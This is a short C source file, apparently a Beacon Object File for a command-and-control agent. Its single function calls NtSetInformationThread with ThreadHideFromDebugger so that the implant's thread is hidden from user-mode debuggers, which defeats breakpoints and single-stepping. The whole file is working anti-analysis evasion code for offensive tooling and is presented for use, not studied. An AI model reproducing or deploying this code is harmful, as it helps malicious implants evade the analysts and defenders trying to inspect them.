/*
 * bof-threadhide
 *
 * Hide the current thread from user-mode debuggers by calling
 * NtSetInformationThread(ThreadHideFromDebugger).  Once set, debug events for
 * this thread are no longer delivered; breakpoints and single-stepping in the
 * agent thread stop working for the debugger.
 *
 * Only affects the calling thread; other agent threads are untouched.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

#define BOF_THREAD_HIDE_FROM_DEBUGGER 17

void go(char *args, int alen)
{
    NTSTATUS st;
    (void)args; (void)alen;

    st = NTDLL$NtSetInformationThread(KERNEL32$GetCurrentThread(),
                                      BOF_THREAD_HIDE_FROM_DEBUGGER,
                                      NULL, 0);
    if (st >= 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] thread %lu hidden from debugger (status 0x%08lx)\n",
                     (unsigned long)KERNEL32$GetCurrentThreadId(),
                     (unsigned long)st);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "NtSetInformationThread failed: 0x%08lx\n",
                     (unsigned long)st);
    }
}
